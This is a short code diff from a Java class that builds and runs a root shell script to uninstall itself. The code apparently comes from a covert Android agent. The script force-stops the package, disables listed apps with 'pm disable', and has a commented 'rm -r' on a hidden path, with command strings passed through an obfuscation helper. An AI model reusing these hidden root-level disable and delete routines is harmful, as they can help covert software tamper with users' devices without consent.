@@ -390,9 +390,6 @@ public class Root {
 			//script += M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib") + "\n";
 			//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
 			String script = "";
-			// in some case of persistent installation package don't get removed because running
-			script += M.e("am force-stop ") + packageName + "\n";
-			//script += M.e("touch /data/local/tmp/") + packageName + Utils.getRandom()+ "\n";
 			for (String app : appToDisable) {
 				if(installed(app)) {
 					script += M.e("pm disable ") + app + "\n";
@@ -461,12 +458,9 @@ public class Root {
 				}
 			}
 			Core.serivceUnregister();
-			ExecuteResult ret = Execute.executeScript(script);
-			if(!ret.getStdErr().isEmpty()){
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (uninstallRoot): failed to execute "+ ret.getStdErr()); //$NON-NLS-1$
-				}
-				//Execute.executeScript(script);
+			boolean ret = Execute.executeRootAndForgetScript(script);
+			if(!ret){
+				Execute.executeScript(script);
 			}
 
 			Utils.sleep(5000);
